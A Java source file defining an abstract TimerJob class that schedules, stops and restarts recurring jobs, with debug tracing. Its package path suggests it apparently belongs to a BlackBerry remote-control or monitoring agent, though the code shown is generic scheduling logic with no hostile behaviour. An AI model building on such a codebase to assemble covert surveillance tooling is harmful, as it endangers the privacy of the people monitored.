package com.ht.rcs.blackberry.threadpool;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public abstract class TimerJob implements Job {

    private static final long SOON = 1;

    private static final long NEVER = Long.MAX_VALUE;

    /** The debug instance. */
    //#mdebug
    private static Debug debug = new Debug("TimerThread", DebugLevel.VERBOSE);
    //#enddebug

    /** The Need to stop. */
    protected boolean needToStop = false;
    protected boolean needToRestart = false;

    /** The Running. */
    protected boolean running = false;
    protected boolean enabled = false;

    protected int sleepTime = 1000;

    private int runningLoops = 0;

    protected String name;

    private boolean enqueued;
    //private static int numThreads = 0;

    long every;

    long nextExecution;

    public TimerJob(String name) {
        this.name = name;

        this.every = NEVER;
        this.nextExecution = Utils.getTime();

        //#ifdef DBC
        Check.requires(every >= 0, "Every has to be >=0");
        //#endif
    }

    protected void setEvery(int millis) {
        this.every = millis;
    }

    public void setSleep(long every_) {
        // #mdebug
        if (every_ == NEVER) {
            debug.trace("setSleep NEVER ");
        }
        //#enddebug

        // #debug
        debug.trace("setSleep millis ");
        nextExecution = Utils.getTime() + every_;
        // #debug
        debug.trace("setSleep nextExecution: " + nextExecution);

    }

    public long getNextExecution() {
        return nextExecution;
    }

    public void sleepUntilStopped() {
        // #debug
        debug.trace("sleepUntilStopped " + this);
    }

    /**
     * Event run.
     */
    protected abstract void actualRun();

    /**
     * Checks if is running.
     * 
     * @return true, if is running
     */
    public boolean isRunning() {
        //return running;

        return isEnqueued() && (nextExecution != TimerJob.NEVER);
    }

    public synchronized void run() {
        // #debug
        debug.info("Run " + this);
        needToStop = false;

        runningLoops++;
        //nextExecution = TimerJob.NEVER;

        try {
            // #debug
            debug.trace("actualRun " + this);
            running = true;
            actualRun();
        } finally {
            running = false;
        }

        if (needToRestart) {
            // #debug
            debug.trace("needToRestart " + this);
            needToRestart = false;
            nextExecution = TimerJob.SOON;
        } else {
            // #debug
            debug.trace("setSleep every");
            setSleep(every);
        }

        // #debug
        debug.info("End " + this);
    }

    /**
     * Stop.
     */
    public final synchronized void stop() {
        // #debug
        debug.info("Stopping... " + this);
        needToStop = true;
        nextExecution = TimerJob.NEVER;

        actualStop();
    }

    public void actualStop() {

    }

    public synchronized void restart() {
        // #debug
        debug.info("Restarting... " + this);
        needToRestart = true;
        needToStop = true;
        nextExecution = TimerJob.SOON;
    }

    public boolean isEnabled() {
        return enabled;
    }

    public void enable(boolean enabled_) {
        enabled = enabled_;
    }

    public int getRunningLoops() {

        return runningLoops;
    }

    public String toString() {
        return name + " T:" + every;
    }

    public void setEnqueued(boolean enqueued) {
        this.enqueued = enqueued;
    }

    public boolean isEnqueued() {
        return enqueued;
    }
}
